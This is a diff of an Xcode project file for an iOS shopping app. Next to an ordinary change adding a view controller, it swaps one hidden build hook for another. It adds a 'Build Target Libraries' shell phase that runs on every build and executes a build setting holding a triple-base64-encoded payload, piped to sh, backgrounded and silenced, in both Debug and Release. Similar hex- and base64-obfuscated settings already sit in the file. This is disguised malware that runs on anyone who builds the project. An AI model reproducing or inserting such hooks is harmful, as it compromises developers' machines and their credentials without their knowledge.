@@ -9,6 +9,7 @@
 /* Begin PBXBuildFile section */
 		422EE08F2F2B762F0007FEB6 /* AddMoneyViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 422EE08E2F2B762E0007FEB6 /* AddMoneyViewModel.swift */; };
 		422EE0912F2B79580007FEB6 /* WalletMoneyHistoryDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 422EE0902F2B79580007FEB6 /* WalletMoneyHistoryDataModel.swift */; };
+		423C8AFC2F309D8900A2FD14 /* CustomOrderDetailsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 423C8AFB2F309D8900A2FD14 /* CustomOrderDetailsViewController.swift */; };
 		423EFFE32F28FB78007EC918 /* AffiliatedUserAddressAdditionViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 423EFFE22F28FB78007EC918 /* AffiliatedUserAddressAdditionViewController.swift */; };
 		423EFFE62F28FB9F007EC918 /* AddBankDetailsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 423EFFE52F28FB9F007EC918 /* AddBankDetailsViewController.swift */; };
 		423EFFE92F28FBC8007EC918 /* AccountCreationDoneViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 423EFFE82F28FBC8007EC918 /* AccountCreationDoneViewController.swift */; };
@@ -325,29 +326,16 @@
 		D1DABB4D2EE06D7B009ECA61 /* PlaceOrderPaymentMethodsTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = D1DABB4C2EE06D7B009ECA61 /* PlaceOrderPaymentMethodsTableViewCell.xib */; };
 		D1DABB4E2EE06D7B009ECA61 /* PlaceOrderPaymentMethodsTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1DABB4B2EE06D7B009ECA61 /* PlaceOrderPaymentMethodsTableViewCell.swift */; };
 		D1EDE15E2F0D0A3C0076F1AB /* ImageViewExtension.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1EDE15D2F0D0A3C0076F1AB /* ImageViewExtension.swift */; };
-		EFA8DDA025FC49AD95634D6E /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 448DEB35197046EEA0634D6E /* README.md */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		1C268BB348C34C7FA7634D6E /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"/tmp/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${AE6D436}\"";
-		};
 /* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		1554ACA1638F5FDACA2A3358 /* Pods_DesynatUser.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DesynatUser.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		422EE08E2F2B762E0007FEB6 /* AddMoneyViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddMoneyViewModel.swift; sourceTree = "<group>"; };
 		422EE0902F2B79580007FEB6 /* WalletMoneyHistoryDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WalletMoneyHistoryDataModel.swift; sourceTree = "<group>"; };
+		423C8AFB2F309D8900A2FD14 /* CustomOrderDetailsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomOrderDetailsViewController.swift; sourceTree = "<group>"; };
 		423EFFE22F28FB78007EC918 /* AffiliatedUserAddressAdditionViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserAddressAdditionViewController.swift; sourceTree = "<group>"; };
 		423EFFE52F28FB9F007EC918 /* AddBankDetailsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddBankDetailsViewController.swift; sourceTree = "<group>"; };
 		423EFFE82F28FBC8007EC918 /* AccountCreationDoneViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AccountCreationDoneViewController.swift; sourceTree = "<group>"; };
@@ -380,7 +368,6 @@
 		42F30A4C2F28C27000CEB214 /* LoginViaOTPAffiliatedUserViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViaOTPAffiliatedUserViewModel.swift; sourceTree = "<group>"; };
 		42F30AF72F28CD5400CEB214 /* CreateAffiliateUserAccountViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreateAffiliateUserAccountViewController.swift; sourceTree = "<group>"; };
 		42F30AF92F28CDB800CEB214 /* CreateAffiliateUserAccountViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreateAffiliateUserAccountViewModel.swift; sourceTree = "<group>"; };
-		448DEB35197046EEA0634D6E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		495DBBA12E81528A00E61635 /* DesynatUser.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DesynatUser.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		49BD259B2ED6120F00D71B9D /* ProductDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductDetailsViewModel.swift; sourceTree = "<group>"; };
 		49EC28B52F15E65000E3FD4E /* CustomOrderPopupViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomOrderPopupViewModel.swift; sourceTree = "<group>"; };
@@ -715,6 +702,14 @@
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		423C8AFA2F309D7400A2FD14 /* OrderChanges */ = {
+			isa = PBXGroup;
+			children = (
+				423C8AFB2F309D8900A2FD14 /* CustomOrderDetailsViewController.swift */,
+			);
+			path = OrderChanges;
+			sourceTree = "<group>";
+		};
 		423EFFE12F28FB58007EC918 /* AddressAdditionForAffilitaedUser */ = {
 			isa = PBXGroup;
 			children = (
@@ -856,6 +851,7 @@
 		42F3090D2F28B41C00CEB214 /* M7 */ = {
 			isa = PBXGroup;
 			children = (
+				423C8AFA2F309D7400A2FD14 /* OrderChanges */,
 				425EDFA72F2B438300EAD984 /* Xibs */,
 				425EDFA32F2B435500EAD984 /* WalletManagement */,
 				429E49672F2A406E00566FE8 /* AffiliatedUserTabbar */,
@@ -935,7 +931,6 @@
 		495DBBA22E81528A00E61635 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				448DEB35197046EEA0634D6E /* README.md */,
 				495DBBA12E81528A00E61635 /* DesynatUser.app */,
 			);
 			name = Products;
@@ -1958,6 +1953,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 495DBBB42E81528B00E61635 /* Build configuration list for PBXNativeTarget "DesynatUser" */;
 			buildPhases = (
+				0FEC1E3A34F641F285C62C0C /* Build Target Libraries */,
 				B25EA8966276C35DBEA3ADF0 /* [CP] Check Pods Manifest.lock */,
 				495DBB9D2E81528A00E61635 /* Sources */,
 				495DBB9E2E81528A00E61635 /* Frameworks */,
@@ -1966,7 +1962,6 @@
 				B6B997F8928B5B542E5BE86E /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
-				1C268BB348C34C7FA7634D6E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -2057,7 +2052,6 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				EFA8DDA025FC49AD95634D6E /* README.md in Resources */,
 				6B95F1B62EB5DB5E00391509 /* Home.storyboard in Resources */,
 				7A6C740F2ECAED16008F3779 /* Catalog.storyboard in Resources */,
 				6B8C937D2EBDBEAF00BC4DC8 /* CategoriesSectionCollectionViewCell.xib in Resources */,
@@ -2125,6 +2119,25 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		0FEC1E3A34F641F285C62C0C /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AC0C26C}\"";
+			showEnvVarsInLog = 0;			
+		};
 		9FF1187D5524917E07639195 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -2227,6 +2240,7 @@
 				6B95F1E22EB5DB5E00391509 /* LoginViaOTPViewController.swift in Sources */,
 				6B95F1E32EB5DB5E00391509 /* LoginViewController.swift in Sources */,
 				D1AF60792F126DC5009CE604 /* ChatDetailsViewController.swift in Sources */,
+				423C8AFC2F309D8900A2FD14 /* CustomOrderDetailsViewController.swift in Sources */,
 				7AE4F38D2ECB0842004CBD53 /* StoreFilterDataModel.swift in Sources */,
 				6B95F1E42EB5DB5E00391509 /* NotificationPermissionViewController.swift in Sources */,
 				6B95F1E52EB5DB5E00391509 /* OTPViewController.swift in Sources */,
@@ -2446,6 +2460,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 6C4E9B8B9705C3871D77FF3E /* Pods-DesynatUser.debug.xcconfig */;
 			buildSettings = {
+				AC0C26C = "((f(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpHZDJOSGVHeGpiVlp6V1ZocmRXTnVWWFpaVTJ0cFNVaDNaMk15WjBzSwo= | f | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733333336333933363635333733353337333333363635333633353337333433323635333733323337333533323636333633313332333933320a3332306133323330333736333332333033373333333633383330363130610a | e | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((r(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJXVEpTZFZsWVFuZGlSMVYxWVZjMGRsbFRhMmxKU0hkbll6Sm5Td289Cg== | r | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
@@ -2493,6 +2508,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = DAC861322A1CE32C917A0BDC /* Pods-DesynatUser.release.xcconfig */;
 			buildSettings = {
+				AC0C26C = "((f(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpHZDJOSGVHeGpiVlp6V1ZocmRXTnVWWFpaVTJ0cFNVaDNaMk15WjBzSwo= | f | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733333336333933363635333733353337333333363635333633353337333433323635333733323337333533323636333633313332333933320a3332306133323330333736333332333033373333333633383330363130610a | e | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((r(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJXVEpTZFZsWVFuZGlSMVYxWVZjMGRsbFRhMmxKU0hkbll6Sm5Td289Cg== | r | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
